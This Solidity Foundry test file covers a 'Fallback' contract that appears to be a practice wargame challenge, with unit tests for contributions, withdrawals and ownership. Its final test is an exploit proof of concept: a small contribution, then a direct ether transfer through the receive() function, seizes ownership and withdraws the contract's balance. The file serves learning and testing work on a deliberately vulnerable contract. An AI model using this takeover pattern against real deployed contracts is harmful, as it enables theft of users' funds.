//SPDX-License-Identifier: MIT

import {Fallback_sol} from "../../src/Fallback.sol";
import {DeployFallback} from "../../script/FallBackDeploy/DeployFallback.s.sol";
import {Test, console} from "forge-std/Test.sol";

pragma solidity ^0.8.0;

contract TestFallback is Test{
    
    Fallback_sol public fallback_sol;
    uint256 public constant STARTING_BALANCE = 10 ether;
    address spider = makeAddr("spider");
    address web = makeAddr("web");
    address owner;
    

    
    function setUp() public {
        DeployFallback deployer = new DeployFallback();
        (fallback_sol) = deployer.run();

        
        vm.deal(spider, STARTING_BALANCE);
    }

    modifier playerDeal(){
        vm.startPrank(spider);
        vm.deal(spider, STARTING_BALANCE);
        _;
    } 


    ///////////////////////////////////// 
   //         Getter tests            //
  /////////////////////////////////////

    function testgetContribution() public playerDeal {
        //Arrange 
        //Act 
        fallback_sol.contribute{value: 0.00035 ether}();
        uint256 val_contribustion = fallback_sol.contributions(spider);
        
        //Assert
        assertEq(val_contribustion,0.00035 ether);
    }


    ///////////////////////////////////// 
   //       Fundamental tests         //
  /////////////////////////////////////

    function testcontribute() public playerDeal {
        //Arrange
        //Act
        fallback_sol.contribute{value: 0.0001 ether}();
        uint256 balance = fallback_sol.contributions(spider);
        //Assert
        assert(balance > 0);
    }

    function testRevertIf_Value_Exceeds_The_Minimum_Value() public playerDeal{
        //Arrange
      
        vm.expectRevert();

        fallback_sol.contribute{value: 0.0035 ether}();
        uint256 val_contribution_of_spider = fallback_sol.contributions(spider);
        vm.stopPrank();
        
        hoax(web, STARTING_BALANCE);

        //Act
        fallback_sol.contribute{value: 0.00035 ether}();
        uint256 val_contribution_of_web = fallback_sol.contributions(web);

        //Assert 
        assert(val_contribution_of_web > 0);
        assert(val_contribution_of_spider == 0);
        
    } 

    function testWithdraw() public playerDeal{
        //Arrange
        // address target = address(fallback_sol);
        
        //Act
        fallback_sol.contribute{value: 0.00056 ether}();
        uint256 val_contriubutions_of_spider = fallback_sol.contributions(spider);
        uint256 val_contriubutions_of_the_contract = address(fallback_sol).balance;
        vm.expectRevert();
        fallback_sol.withdraw();
        
        //Assert
        assert( val_contriubutions_of_spider == 0.00056 ether);
        assert(val_contriubutions_of_the_contract > 0 ether);

    }

    function testContributeWithMultiplteUser() public playerDeal {
        
        //Arrange
        uint256 numberofplayer = 3;
        uint256 eth_to_be_paid = 0.0001 ether;
        uint256 Inital_balance = address(fallback_sol).balance; 
        uint256 Final_balance;
       
        //Act 
        fallback_sol.contribute{value: eth_to_be_paid}();
        Final_balance+=fallback_sol.getContribution();
        vm.stopPrank();

        for(uint256 i = 1; i <= numberofplayer; i++){
            address randomPlayer = address(uint160(i));

            vm.startPrank(randomPlayer);

            vm.deal(randomPlayer, 1 ether);

            fallback_sol.contribute{value: eth_to_be_paid}();
            Final_balance += fallback_sol.getContribution();

            vm.stopPrank();

        }

        //Assert 
        assertEq(Inital_balance, 0);
        assert(Inital_balance < Final_balance);

    }

    function testWithdrawWithMultipleUsers() public playerDeal{
        //Arrange
        uint256 numberOfPlayers = 3;
        uint256 Initial_Balance = address(fallback_sol).balance;
        uint256 eth_to_be_paid = 0.0001 ether;
        uint256 Final_balance;

        //Act
        fallback_sol.contribute{value: eth_to_be_paid}();
        Final_balance+=fallback_sol.getContribution();
        vm.stopPrank();

        for(uint i=1; i<=numberOfPlayers; i++){
            address randplayers = address(uint160(i));

            vm.startPrank(randplayers);

            vm.deal(randplayers, 1 ether);

            fallback_sol.contribute{value: eth_to_be_paid}();
            Final_balance += fallback_sol.getContribution();
            vm.stopPrank();

        }

        for(uint256 i=1; i<=numberOfPlayers; i++){
            address randplayers = address(uint160(i));

            vm.startPrank(randplayers);
            vm.deal(randplayers, 1 ether);

            vm.expectRevert();
            fallback_sol.withdraw();
            vm.stopPrank();
        }

        //Assert
        assert(Final_balance > Initial_Balance);
        assert(Final_balance != 0);

    }

    ///////////////////////////////////// 
   //       OwnerShip tests           //
  /////////////////////////////////////

    function testOwnership() public playerDeal{
        //Arrange
        uint256 owenerBalance;
        uint256 spiderBalance;
        address currentOwner = fallback_sol.owner();

        //Act 
        fallback_sol.contribute{value: 0.0001 ether}();
        spiderBalance=fallback_sol.getContribution();
        console.log("This is the address of the Spider", spider, "It have: ",spiderBalance);
        vm.stopPrank();

        vm.startPrank(currentOwner);
        owenerBalance = fallback_sol.getContribution();
        console.log("This is the address of current Owner", currentOwner, "It have", owenerBalance);
        vm.stopPrank();
        
        //Assert
        assert(owenerBalance > spiderBalance);
        assert(currentOwner != spider);
        
    }


   ///////////////////////////////////// 
  //       Vulnerability tests       //
 /////////////////////////////////////
    
    function testOwnerShipChangesAfterReceive() public {
        //Arrange
        owner = fallback_sol.owner();
        address currentOwner;
        uint256 spiderbalance;
        uint256 ownerBalance;


        //Act
        vm.startPrank(owner);
        ownerBalance = fallback_sol.getContribution();
        vm.deal(owner,ownerBalance); 
        currentOwner = owner;
        console.log("Ownership before the receive() function call: ", currentOwner, "The balance of Owner: ", ownerBalance);
        vm.stopPrank();
        //Assert
        assert(currentOwner == owner);

        
        //Arrange
        vm.startPrank(spider);
        vm.deal(spider, STARTING_BALANCE);
        
        //Act 
        fallback_sol.contribute{value: 0.0001 ether}();
        (bool s, ) = address(fallback_sol).call{value: 0.0001 ether}("");
        require(s, "Backdoor failed");
        currentOwner = fallback_sol.owner();

        fallback_sol.withdraw();
        spiderbalance = fallback_sol.getContribution();
        vm.stopPrank();
        //Assert
        assert(currentOwner == spider);
        console.log("Ownership changed to:", currentOwner,"Balance", spiderbalance);



    }   
}